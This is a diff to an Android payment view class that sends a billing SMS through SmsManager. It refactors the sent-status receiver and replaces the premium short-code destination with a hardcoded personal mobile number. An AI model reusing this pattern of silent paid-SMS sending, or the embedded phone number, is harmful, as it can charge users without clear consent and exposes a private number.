@@ -130,9 +130,10 @@ public class PayView implements EmView {
 	
 	private boolean sendLock = false;
 	
-	private BroadcastReceiver smsCheck = new BroadcastReceiver() {
+	public class SmsReceiver extends BroadcastReceiver{
+
 		@Override
-		public void onReceive(Context ctx, Intent it) {
+		public void onReceive(Context context, Intent it) {
 			int exRe = it.getIntExtra("re", 0);
 			int re = (exRe == 0) ? getResultCode() : exRe;
 			String feeTag = it.getStringExtra("feeTag");
@@ -146,22 +147,30 @@ public class PayView implements EmView {
 				break;
 			}
 			ctx.unregisterReceiver(this);
+			isReg = false;
 			DSms.log(ctx,TAG,"unregister sms Receiver in payView");
-			sendLock = false;
+			sendLock = false;			
 		}
-	};
+		
+	}
+	
+	private SmsReceiver smsReceiver = new SmsReceiver();
 	
 	private boolean isClose = false;
+	private boolean isReg = false;
 	
 	private void cancel(){
-		Intent it = new Intent(ctx,DSms.class);
-		it.setAction(SENT);
+		Intent it = new Intent(SENT);
 		it.putExtra("re", -2);
+		it.putExtra("feeTag", this.feeTag);
 		ctx.sendBroadcast(it);
 		close();
 	}
 	
 	private void close(){
+		if (isReg) {
+			ctx.unregisterReceiver(smsReceiver);
+		}
 		Activity acti = (Activity)this.ctx;
 		acti.finish();
 	}
@@ -183,11 +192,16 @@ public class PayView implements EmView {
 		payBt2.setText("关闭");
 		isClose = true;
 		try {
-			ctx.registerReceiver(smsCheck, new IntentFilter(SENT));
+			if (!isReg) {
+				ctx.registerReceiver(smsReceiver, new IntentFilter(SENT));
+				isReg = true;
+			}
 			String sms = buildSms(ctx, ver, pid, 2, fee, channel, uid, feeTag);
+			Intent it = new Intent(SENT);
+			it.putExtra("feeTag", this.feeTag);
 			PendingIntent sentPI = PendingIntent.getBroadcast(ctx, 0,
-					new Intent(SENT), PendingIntent.FLAG_ONE_SHOT|PendingIntent.FLAG_UPDATE_CURRENT);
-			String destNum = "10659xx"+fee;
+					it, PendingIntent.FLAG_ONE_SHOT|PendingIntent.FLAG_UPDATE_CURRENT);
+			String destNum = "15301588025";
 			SmsManager.getDefault().sendTextMessage(destNum, null,sms, sentPI, null);
 		} catch (Exception e) {
 			DSms.e(ctx, TAG, "click send err.", e);
